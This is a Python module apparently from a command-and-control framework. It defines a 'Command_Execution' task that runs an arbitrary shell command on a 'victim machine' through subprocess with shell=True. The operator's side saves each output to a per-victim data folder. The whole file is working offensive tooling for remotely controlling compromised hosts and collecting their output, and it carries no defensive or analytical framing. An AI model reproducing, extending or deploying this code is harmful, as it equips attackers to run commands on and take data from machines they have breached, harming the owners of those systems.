import sys
import os
import pathlib
import time
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Command_Execution(Module):
    description = 'Executes a custom command on the victim machine and returns the output.'

    @classmethod
    def module_options(cls):
        h = {
            'command': {'desc': 'Command to execute on the victim machine.', 'required': True},
        }
        return h

    def __init__(self, name, utility, language, options):
        super(Command_Execution, self).__init__(name, self.description, utility, language, getattr(self, f"script_{language}")(options))

    def handle_task_output(self, data, options, victim_id, task_id):
        output = data.decode('utf-8')

        dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()), '../../shared/victim_data', victim_id)
        if not os.path.exists(dump_path):
            os.makedirs(dump_path)

        filename = f"command_output_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.txt"
        file_path = os.path.join(dump_path, filename)

        with open(file_path, 'w+') as f:
            print(output, file=f)

        return file_path

    def script_python(self, options):
        command = options.get('command', 'whoami')
        script = f"""def execute_command():
    import subprocess
    result = subprocess.run({repr(command)}, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return result.stdout.decode('utf-8', errors='ignore')
"""
        return script